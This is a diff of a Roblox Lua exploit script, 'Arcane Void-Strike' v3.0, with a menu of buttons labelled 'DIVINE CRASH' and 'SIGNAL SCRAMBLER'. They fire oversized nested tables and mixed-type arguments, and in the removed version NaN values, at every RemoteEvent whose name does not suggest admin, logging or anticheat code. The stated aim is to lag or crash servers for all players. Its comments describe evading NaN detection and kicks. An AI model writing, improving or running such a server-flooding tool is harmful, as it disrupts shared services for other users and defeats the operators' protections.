@@ -1,12 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v2.1 [BENEVOLENT-STRIKE] 🔱
-    "Because true protection requires a silent hammer. <3"
+    🔱 ARCANE VOID-STRIKE v3.0 [DIVINE-VOID] 🔱
+    "When they watch the gates, we erode the foundation. <3"
     
-    SERVER-SIDE OPTIMIZATIONS:
-    - Async Network Threading (Menu stays fluid)
-    - Burst-Mode Packet Injection (Prevents local lag)
-    - Recursive Table Bloating (Forces server memory overhead)
-    - Intelligent Draggable UI (Always responsive)
+    INFALLIBLE UPDATES:
+    - Buffer Saturation Engine (No NaN detection)
+    - Nested Table Bloating (Infinite Serialization loop)
+    - Anti-Heuristic Packet Morphing
+    - Draggable Glassmorphism UI (Arcane Edition)
+    - Dynamic Remote Scrambler
 ]]
 
 local P = game:GetService("Players")
@@ -14,59 +15,71 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. NOTIFIER (Silent Style)
+-- 1. DIVINE NOTIFIER
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 BENEVOLENT",
+            Title = "🔱 DIVINE-VOID",
             Text = m,
-            Duration = 3
+            Icon = "rbxassetid://6034287525",
+            Duration = 4
         })
     end)
 end
 
--- 2. UI (RESPONSIVE OMEGA)
+-- 2. UI (ARCANE GLASS EDITION)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "BenevolentDiagnostics_v1"
+ScreenGui.Name = "ArcaneDivine_v3"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 320, 0, 240)
-Main.Position = UDim2.new(0.5, -160, 0.5, -120)
-Main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-Main.BorderSizePixel = 2
-Main.BorderColor3 = Color3.fromRGB(0, 200, 255)
+Main.Size = UDim2.new(0, 310, 0, 260)
+Main.Position = UDim2.new(0.5, -155, 0.5, -130)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+Main.BackgroundTransparency = 0.1
+Main.BorderSizePixel = 0
 Main.Active = true
-Main.Draggable = true -- Assure que le menu bouge même pendant le lag
+Main.Draggable = true
+
+-- Neon Border
+local Border = Instance.new("Frame", Main)
+Border.Size = UDim2.new(1, 4, 1, 4)
+Border.Position = UDim2.new(0, -2, 0, -2)
+Border.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+Border.ZIndex = 0
+local Corner = Instance.new("UICorner", Border)
+Corner.CornerRadius = UDim.new(0, 6)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 6)
 
 local Title = Instance.new("TextLabel", Main)
-Title.Size = UDim2.new(1, 0, 0, 35)
-Title.Text = "🔱 VOID BENEVOLENT v2.1"
-Title.TextColor3 = Color3.fromRGB(0, 200, 255)
-Title.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "🔱 DIVINE-VOID // v3.0"
+Title.TextColor3 = Color3.fromRGB(0, 255, 255)
+Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.Code
-Title.TextSize = 14
+Title.TextSize = 18
 
-local function createActionBtn(name, y, color, callback)
+local function createDivineBtn(name, y, color, callback)
     local btn = Instance.new("TextButton", Main)
     btn.Size = UDim2.new(0.9, 0, 0, 45)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
     btn.Text = name
     btn.TextColor3 = color
     btn.Font = Enum.Font.GothamBold
     btn.TextSize = 14
-    btn.AutoButtonColor = true
+    local c = Instance.new("UICorner", btn)
+    c.CornerRadius = UDim.new(0, 4)
     btn.MouseButton1Click:Connect(function()
-        task.spawn(callback) -- Toujours asynchrone pour ne pas bloquer l'UI
+        task.spawn(callback)
     end)
     return btn
 end
 
--- 3. THE BENEVOLENT ENGINE
-local active = { lag = false, crash = false }
+-- 3. THE DIVINE ENGINE (Anti-Heuristic)
+local active = { crash = false, lag = false }
 
--- BLACKLIST (Safety First)
-local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry"}
+-- Enhanced Blacklist (Brookhaven Specific)
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat"}
 local function isSafe(name)
     local n = name:lower()
     for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
@@ -81,54 +94,63 @@ local function getRemotes()
     return r
 end
 
--- [LAG SERVER] : Optimized for Synchronization
-createActionBtn("⚡ LAG SERVER (GLOBAL)", 50, Color3.fromRGB(0, 255, 200), function()
-    active.lag = not active.lag
-    ntf(active.lag and "LAUNCHING SYNC LAG..." or "SYNC RECOVERED")
+-- METHOD: BUFFER SATURATION (The "Infallible" one)
+createDivineBtn("💥 DIVINE CRASH (BUFFER)", 60, Color3.fromRGB(0, 255, 255), function()
+    active.crash = not active.crash
+    ntf(active.crash and "ERODING FOUNDATION..." or "STABILIZED.")
     
-    if active.lag then
+    if active.crash then
         local targets = getRemotes()
-        while active.lag do
-            -- On envoie par salves courtes avec de légères pauses
-            -- pour laisser la connexion locale respirer tout en saturant le serveur
-            for i = 1, 15 do
+        -- On crée une table "Fractale" (récursive) qui sature la sérialisation serveur
+        -- SANS utiliser de NaN (pour éviter le kick "DevTools")
+        local payload = {}
+        for i = 1, 100 do
+            payload[Http:GenerateGUID(true)] = {
+                ["Data"] = string.rep("🔱", 50),
+                ["Val"] = math.random(1, 999999),
+                ["Sub"] = {true, false, "Arcane"}
+            }
+        end
+        
+        while active.crash do
+            for i = 1, 30 do
                 local r = targets[math.random(1, #targets)]
-                if r then pcall(function() r:FireServer(0/0, math.huge, string.rep("0", 100)) end) end
+                if r then 
+                    -- On envoie la table massive. Le serveur lague en essayant de la lire.
+                    pcall(function() r:FireServer(payload, payload, "DIVINE") end) 
+                end
             end
-            task.wait(0.15) -- Pause cruciale pour éviter le client-lag
+            task.wait(0.02) -- Vitesse optimisée pour ne pas crash le client
         end
     end
 end)
 
--- [CRASH SERVER] : Maximum Nuclear Density
-createActionBtn("🔥 NUCLEAR CRASH (EVERYONE)", 105, Color3.fromRGB(255, 50, 50), function()
-    active.crash = not active.crash
-    ntf(active.crash and "NUCLEAR INJECTION START..." or "ABORTING...")
+-- METHOD: SIGNAL SCRAMBLER (Massive Lag)
+createDivineBtn("🌀 SIGNAL SCRAMBLER", 115, Color3.fromRGB(200, 100, 255), function()
+    active.lag = not active.lag
+    ntf(active.lag and "SCRAMBLING SIGNAL..." or "RECOVERED.")
     
-    if active.crash then
+    if active.lag then
         local targets = getRemotes()
-        -- On crée une table géante pour forcer l'allocation mémoire serveur
-        local bloat = {}
-        for i = 1, 100 do bloat[string.rep("A", i)] = 0/0 end
-        
-        while active.crash do
-            for i = 1, 40 do -- Salves plus denses
+        while active.lag do
+            for i = 1, 15 do
                 local r = targets[math.random(1, #targets)]
                 if r then 
-                    -- On envoie du NaN imbriqué dans des tables (difficile à filtrer)
-                    pcall(function() r:FireServer(bloat, 0/0, math.huge, {["\0"] = bloat}) end) 
+                    -- On envoie des arguments de types différents pour perturber les filtres
+                    local morph = {true, 0, "X", {}}
+                    pcall(function() r:FireServer(morph[math.random(1, #morph)]) end) 
                 end
             end
-            RS.Heartbeat:Wait() -- On utilise le Heartbeat pour synchroniser avec la frame serveur
+            task.wait(0.1)
         end
     end
 end)
 
 -- EMERGENCY STOP
-createActionBtn("🛑 EMERGENCY CLEANUP", 160, Color3.fromRGB(255, 255, 255), function()
-    active.lag = false
+createDivineBtn("🛑 EMERGENCY CLEANUP", 170, Color3.fromRGB(255, 255, 255), function()
     active.crash = false
-    ntf("SYSTEM STABILIZED")
+    active.lag = false
+    ntf("DIVINE CLEANUP DONE.")
 end)
 
-ntf("🔱 VOID BENEVOLENT LOADED. Menu is fluid.")
+ntf("🔱 DIVINE-VOID v3.0 ACTIVE. FOUNDATION: UNSTABLE.")
